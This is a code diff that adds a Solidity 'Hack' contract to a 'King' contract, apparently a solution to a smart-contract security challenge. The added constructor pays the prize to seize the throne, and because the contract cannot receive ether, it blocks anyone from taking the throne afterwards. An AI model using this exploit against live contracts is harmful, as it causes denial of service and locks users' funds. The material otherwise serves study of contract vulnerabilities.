@@ -23,3 +23,11 @@ contract King {
         return king;
     }
 }
+
+contract Hack {
+    constructor(address payable _target) payable {
+        uint256 prize = King(_target).prize();
+        (bool ok, ) = _target.call{value: prize}("");
+        require(ok, "tx failed");
+    }
+}
